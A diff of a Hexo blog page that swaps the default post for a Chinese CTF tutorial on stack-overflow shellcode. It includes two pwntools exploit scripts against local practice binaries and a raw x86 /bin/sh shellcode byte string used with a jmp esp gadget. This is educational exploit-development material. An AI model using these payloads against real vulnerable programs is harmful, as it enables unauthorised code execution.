@@ -16,23 +16,27 @@
   <meta name="author" content="TKYmax">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="什么是ShellcodeShellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行 怎么生成ShellcodeShellcode的生成方法通常有以下几种：  在pwntools中由shellcr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2024/07/18/hello-world/index.html">
+<meta property="og:title" content="Shellcode">
+<meta property="og:url" content="http://example.com/2024/07/18/Shellcode/index.html">
 <meta property="og:site_name" content="能打八个攻城狮">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="什么是ShellcodeShellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行 怎么生成ShellcodeShellcode的生成方法通常有以下几种：  在pwntools中由shellcr">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/image-20240718185738048.png">
-<meta property="article:published_time" content="2024-07-18T10:37:35.300Z">
-<meta property="article:modified_time" content="2024-07-18T11:11:55.033Z">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/40174-20240615224646225-696758059.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/40174-20240615225943864-1256445096.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615230113982-2038105599.png">
+<meta property="article:published_time" content="2024-07-18T08:06:06.000Z">
+<meta property="article:modified_time" content="2024-07-18T13:39:52.275Z">
 <meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/image-20240718185738048.png">
+<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/40174-20240615224646225-696758059.png">
   
   
   
-  <title>Hello World - 能打八个攻城狮</title>
+  <title>Shellcode - 能打八个攻城狮</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -225,7 +229,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="Shellcode"></span>
           
         </div>
 
@@ -236,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-18 18:37" pubdate>
-          2024年7月18日 晚上
+        <time datetime="2024-07-18 16:06" pubdate>
+          2024年7月18日 下午
         </time>
       </span>
     
@@ -248,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18 字
+          471 字
         
       </span>
     
@@ -259,7 +263,7 @@
         
         
         
-          1 分钟
+          4 分钟
         
       </span>
     
@@ -296,25 +300,27 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header">Shellcode</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<p><img src="/2024/07/18/hello-world/image-20240718185738048.png" srcset="/img/loading.gif" lazyload alt="image-20240718185738048"></p>
+                <h2 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h2><p><strong>Shellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行</strong></p>
+<h2 id="怎么生成Shellcode"><a href="#怎么生成Shellcode" class="headerlink" title="怎么生成Shellcode"></a>怎么生成Shellcode</h2><p><strong>Shellcode的生成方法通常有以下几种：</strong></p>
+<ol>
+<li>在pwntools中由shellcraft模块生成</li>
+<li>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li>
+<li>通过Metasploit生成</li>
+</ol>
+<h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode</a><br><img src="/2024/07/18/hello-world/40174-20240615224646225-696758059.png" srcset="/img/loading.gif" lazyload><br>查看保护没有开NX，可以用Shellcode<br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png" srcset="/img/loading.gif" lazyload><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p>
+<h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="/2024/07/18/hello-world/40174-20240615225943864-1256445096.png" srcset="/img/loading.gif" lazyload><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615230113982-2038105599.png" srcset="/img/loading.gif" lazyload><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><strong>从payload起始地址开始构造Shellcode，之后调整esp到Shellcode起始位置</strong>、</p>
+<blockquote>
+<p>为什么要用jmp_esp而不是直接用Shellcode覆盖返回地址？<br>当pop main_addr后esp在main_上边，直接执行sub_esp_jmp在栈外执行，会异常，所以我们要把EIP调整到栈内再把EIP控制到sub_esp_jmp这样就没有问题了</p>
+</blockquote>
 
                 
               </div>
@@ -323,6 +329,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%A0%88/" class="print-no-link">#栈</a>
+      
+    </div>
   
 </div>
 
@@ -334,12 +368,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/" title="编写单个函数的ROP链">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">编写单个函数的ROP链</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/" title="绕过保护之Canary">
-                        <span class="hidden-mobile">绕过保护之Canary</span>
+                      <a href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/" title="初识栈溢出">
+                        <span class="hidden-mobile">初识栈溢出</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
